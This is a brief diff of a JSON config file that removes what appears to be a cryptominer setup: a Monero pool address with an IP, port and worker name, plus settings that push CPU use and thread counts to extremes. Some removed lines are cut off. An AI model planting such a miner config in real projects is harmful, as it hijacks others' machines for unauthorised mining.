@@ -6,23 +6,4 @@
         "huge-pages": true,
         "hw-aes": null,
         "priority": null,
-        "asm": true,
-        "max-threads-hint": 9900,
-        "max-cpu-usage": 9900,
-        "yield": false,
-        "init": -1,
-        "*": {
-            "intensity": 2,
-            "threads": 999,
-            "affinity": -1
-     
-    "opencl": false,
-    "cuda": false,
-    "pools": [
-        {
-            "coin": "monero",
-            "algo": "cn/gpu",
-            "url": "168.235.86.33:3393",
-            "user": "SK_QzApkbVGsAxyQykaWSnEF.prestes",
-            "pass": "x",
-      
+  
